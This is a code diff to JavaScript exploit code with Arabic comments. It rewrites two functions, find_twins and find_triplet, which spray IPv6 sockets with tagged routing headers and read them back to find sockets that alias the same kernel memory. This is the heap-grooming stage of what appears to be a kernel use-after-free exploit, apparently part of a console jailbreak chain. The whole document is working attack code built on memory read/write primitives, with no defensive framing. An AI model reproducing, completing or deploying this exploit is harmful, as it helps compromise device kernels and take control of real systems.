@@ -787,83 +787,72 @@ function fill_buffer_64(buf, val, len) {
     write64(buf.add(i), val);
   }
 }
-function find_twins(ipv6_socks, spray_add, leak_add, spray_rthdr, spray_rthdr_len, leak_rthdr, RTHDR_TAG) {
+function find_twins() {
+  var count = 0;
+  var val, i, j;
+  var zeroMemoryCount = 0;
+  twins[0] = -1;
+  twins[1] = -1;
 
+  var spray_add = spray_rthdr.add(0x04);
+  var leak_add  = leak_rthdr.add(0x04);
 
-  let twins = [-1, -1];
+  while (count < MAX_ROUNDS_TWIN) {
 
-  // -------------------------------
-  // Phase 1 — Tagging (كتابة العلامات)
-  // -------------------------------
-  for (let i = 0; i < ipv6_socks.length; i++) {
+    // كتابة TAG لكل socket
+    for (i = 0; i < ipv6_socks.length; i++) {
+      if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
-    if (ipv6_socks[i].eq(BigInt_Error))
-      continue;
+      write32(spray_add, RTHDR_TAG | i);
+      read32(spray_add);
 
-    // كتابة TAG + رقم العنصر
-    write32(spray_add, RTHDR_TAG | i);
-    read32(spray_add);
-
-    // كتابة البيانات للـ socket
-    set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
-  }
-
-  // -------------------------------
-  // Phase 2 — Reading (قراءة العلامات)
-  // -------------------------------
-  for (let i = 0; i < ipv6_socks.length; i++) {
-
-    if (ipv6_socks[i].eq(BigInt_Error))
-      continue;
-
-    // تصفير مكان القراءة
-    write32(leak_add, 0);
-
-    // قراءة البيانات من الـ socket
-    get_rthdr(ipv6_socks[i], leak_rthdr, 8);
-
-    // قراءة القيمة اللي اتكتبت
-    let val = read32(leak_add);
-    let j = val & 0xFFFF;
-
-    // -------------------------------
-    // Phase 3 — Detection (اكتشاف العلاقة)
-    // -------------------------------
-    if ((val & 0xFFFF0000) === RTHDR_TAG &&
-        i !== j &&
-        j >= 0 &&
-        j < ipv6_socks.length) {
-
-      twins[0] = i;
-      twins[1] = j;
-
-      log("TWINS FOUND: [" + i + "] & [" + j + "]");
-      return twins;
+      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
+
+    // قراءة كل socket
+    for (i = 0; i < ipv6_socks.length; i++) {
+      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+
+      write32(leak_add, 0);
+      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
+
+      val = read32(leak_add);
+      j = val & 0xFFFF;
+
+      if ((val & 0xFFFF0000) === RTHDR_TAG &&
+          i !== j &&
+          j >= 0 &&
+          j < ipv6_socks.length) {
+
+        twins[0] = i;
+        twins[1] = j;
+
+        log("TWINS FOUND: [" + i + "] & [" + j + "]");
+        return true;
+      }
+    }
+
+    count++;
   }
 
-  return null;
+  twins[0] = -1;
+  twins[1] = -1;
+  return false;
 }
 function find_triplet(master, other, iterations) {
-
   if (typeof iterations === 'undefined')
-    iterations = MAX_ROUNDS_TRIPLET;
+      iterations = MAX_ROUNDS_TRIPLET;
 
-  let count = 0;
-  let val, j;
+  var count = 0;
+  var val, i, j;
 
-  // أماكن الكتابة والقراءة
-  let spray_add = spray_rthdr.add(0x04);
-  let leak_add  = leak_rthdr.add(0x04);
+  var spray_add = spray_rthdr.add(0x04);
+  var leak_add  = leak_rthdr.add(0x04);
 
   while (count < iterations) {
 
-    // -------------------------------
-    // Phase 1 — Tagging
     // كتابة TAG لكل socket ماعدا master و other
-    // -------------------------------
-    for (let i = 0; i < ipv6_socks.length; i++) {
-
+    for (i = 0; i < ipv6_socks.length; i++) {
       if (i === master || i === other) continue;
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
@@ -873,40 +862,29 @@ function find_triplet(master, other, iterations) {
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
 
-    // -------------------------------
-    // Phase 2 — Reading
-    // قراءة master فقط
-    // -------------------------------
+    // قراءة master
     write32(leak_add, 0);
     get_rthdr(ipv6_socks[master], leak_rthdr, 8);
 
     val = read32(leak_add);
     j = val & 0xFFFF;
 
-    // -------------------------------
-    // Phase 3 — Filtering
     // منع false positives
-    // -------------------------------
     if (j === master || j === other) {
       count++;
       continue;
     }
 
-    // -------------------------------
-    // Phase 4 — Detection
-    // اكتشاف عنصر ثالث
-    // -------------------------------
     if ((val & 0xFFFF0000) === RTHDR_TAG &&
         j >= 0 &&
         j < ipv6_socks.length) {
-
-      return j; // عنصر ثالث
+      return j;
     }
 
     count++;
   }
 
-  return -1; // مفيش عنصر ثالث
+  return -1;
 }
 function init_threading() {
   var jmpbuf = malloc(0x60);
